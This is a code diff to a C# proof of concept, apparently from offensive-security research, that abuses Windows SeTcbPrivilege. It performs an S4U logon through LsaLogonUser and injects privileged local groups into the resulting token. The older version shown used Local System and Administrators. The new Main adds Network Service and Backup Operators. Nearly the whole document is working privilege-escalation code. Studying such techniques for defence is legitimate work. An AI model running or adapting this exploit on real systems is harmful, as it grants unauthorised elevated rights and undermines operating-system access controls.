@@ -4,6 +4,7 @@ using System.IO;
 using System.Security.Principal;
 using System.Text;
 using System.Runtime.InteropServices;
+using System.Collections.Generic;
 
 namespace SeTcbPrivilegePoC
 {
@@ -379,7 +380,7 @@ namespace SeTcbPrivilegePoC
             uint AuthenticationPackage,
             IntPtr AuthenticationInformation,
             uint AuthenticationInformationLength,
-            in TOKEN_GROUPS LocalGroups,
+            IntPtr /* in TOKEN_GROUPS */ LocalGroups,
             in TOKEN_SOURCE SourceContext,
             out IntPtr ProfileBuffer,
             out uint ProfileBufferLength,
@@ -470,14 +471,19 @@ namespace SeTcbPrivilegePoC
         }
 
 
-        public static IntPtr GetMsvS4uLogonToken(string upn, string domain)
+        static IntPtr GetMsvS4uLogonToken(string upn, string domain, List<string> localGroupSids)
         {
             var hS4uLogonToken = IntPtr.Zero;
 
             do
             {
+                IntPtr pTokenGroups;
+                int nGroupCount = localGroupSids.Count;
                 var pkgName = new LSA_STRING(MSV1_0_PACKAGE_NAME);
-                var tokenGroups = new TOKEN_GROUPS(6);
+                var nGroupsOffset = Marshal.OffsetOf(typeof(TOKEN_GROUPS), "Groups").ToInt32();
+                var nTokenGroupsSize = nGroupsOffset;
+                var pSidBuffersToLocalFree = new List<IntPtr>();
+                nTokenGroupsSize += (Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES)) * nGroupCount);
 
                 NTSTATUS ntstatus = LsaConnectUntrusted(out IntPtr hLsa);
 
@@ -496,25 +502,39 @@ namespace SeTcbPrivilegePoC
                     break;
                 }
 
-                ConvertStringSidToSid("S-1-1-0", out IntPtr pEveryoneSid);
-                ConvertStringSidToSid("S-1-5-11", out IntPtr pAuthenticatedUsersSid);
-                ConvertStringSidToSid("S-1-5-18", out IntPtr pLocalSystemSid);
-                ConvertStringSidToSid("S-1-5-20", out IntPtr pNetworkServiceSid);
-                ConvertStringSidToSid("S-1-5-32-544", out IntPtr pAdminSid);
-                ConvertStringSidToSid("S-1-5-32-551", out IntPtr pBackupOperatorSid);
+                if (nGroupCount > 0)
+                {
+                    int nUnitSize = Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));
+                    var attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                    pTokenGroups = Marshal.AllocHGlobal(nTokenGroupsSize);
+                    nGroupCount = 0;
+                    ZeroMemory(pTokenGroups, nTokenGroupsSize);
 
-                tokenGroups.Groups[0].Sid = pEveryoneSid;
-                tokenGroups.Groups[0].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[1].Sid = pAuthenticatedUsersSid;
-                tokenGroups.Groups[1].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[2].Sid = pLocalSystemSid;
-                tokenGroups.Groups[2].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[3].Sid = pNetworkServiceSid;
-                tokenGroups.Groups[3].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[4].Sid = pAdminSid;
-                tokenGroups.Groups[4].Attributes = (int)(SE_GROUP_ATTRIBUTES.OWNER | SE_GROUP_ATTRIBUTES.ENABLED);
-                tokenGroups.Groups[5].Sid = pBackupOperatorSid;
-                tokenGroups.Groups[5].Attributes = (int)(SE_GROUP_ATTRIBUTES.MANDATORY | SE_GROUP_ATTRIBUTES.ENABLED);
+                    foreach (var stringSid in localGroupSids)
+                    {
+                        if (ConvertStringSidToSid(stringSid, out IntPtr pSid))
+                        {
+                            Marshal.WriteIntPtr(pTokenGroups, (nGroupsOffset + (nGroupCount * nUnitSize)), pSid);
+                            Marshal.WriteInt32(pTokenGroups, (nGroupsOffset + (nGroupCount * nUnitSize) + IntPtr.Size), attributes);
+                            pSidBuffersToLocalFree.Add(pSid);
+                            nGroupCount++;
+                        }
+                    }
+
+                    if (nGroupCount == 0)
+                    {
+                        Marshal.FreeHGlobal(pTokenGroups);
+                        pTokenGroups = IntPtr.Zero;
+                    }
+                    else
+                    {
+                        Marshal.WriteInt32(pTokenGroups, nGroupCount);
+                    }
+                }
+                else
+                {
+                    pTokenGroups = IntPtr.Zero;
+                }
 
                 using (var msv = new MSV1_0_S4U_LOGON(MSV1_0_LOGON_SUBMIT_TYPE.MsV1_0S4ULogon, 0, upn, domain))
                 {
@@ -528,7 +548,7 @@ namespace SeTcbPrivilegePoC
                         authnPkg,
                         msv.Buffer,
                         (uint)msv.Length,
-                        in tokenGroups,
+                        pTokenGroups,
                         in tokenSource,
                         out IntPtr ProfileBuffer,
                         out uint _,
@@ -540,19 +560,23 @@ namespace SeTcbPrivilegePoC
                     LsaClose(hLsa);
 
                     if (ntstatus != STATUS_SUCCESS)
+                    {
+                        hS4uLogonToken = IntPtr.Zero;
                         SetLastError(LsaNtStatusToWinError(ntstatus));
+                    }
                     else
+                    {
                         hS4uLogonToken = Marshal.ReadIntPtr(pTokenBuffer);
+                    }
 
                     Marshal.FreeHGlobal(pTokenBuffer);
                 }
 
-                LocalFree(pEveryoneSid);
-                LocalFree(pAuthenticatedUsersSid);
-                LocalFree(pLocalSystemSid);
-                LocalFree(pNetworkServiceSid);
-                LocalFree(pAdminSid);
-                LocalFree(pBackupOperatorSid);
+                if (pTokenGroups != IntPtr.Zero)
+                    Marshal.FreeHGlobal(pTokenGroups);
+
+                foreach (var pSidBuffer in pSidBuffersToLocalFree)
+                    LocalFree(pSidBuffer);
             } while (false);
 
             return hS4uLogonToken;
@@ -630,18 +654,30 @@ namespace SeTcbPrivilegePoC
         }
 
 
+        static void ZeroMemory(IntPtr pBuffer, int nLength)
+        {
+            for (var offset = 0; offset < nLength; offset++)
+                Marshal.WriteByte(pBuffer, offset, 0);
+        }
+
+
         static void Main()
         {
             int error;
             bool status;
             IntPtr hS4uToken;
+            var localGroups = new List<string>
+            {
+                "S-1-5-20",    // NT AUTHORITY\NETWORK SERVICE
+                "s-1-5-32-551" // BUILTIN\Backup Operators
+            };
 
             Console.WriteLine("[*] If you have SeTcbPrivilege, you can perform S4U Logon.");
             Console.WriteLine("[*] This PoC tries to perform S4U Logon and add \"Builtin\\Backup Operators\" to current token group.");
 
             Console.WriteLine("[>] Trying to create S4U logon token.");
 
-            hS4uToken = GetMsvS4uLogonToken(Environment.UserName, Environment.UserDomainName);
+            hS4uToken = GetMsvS4uLogonToken(Environment.UserName, Environment.UserDomainName, localGroups);
 
             if (hS4uToken == IntPtr.Zero)
             {
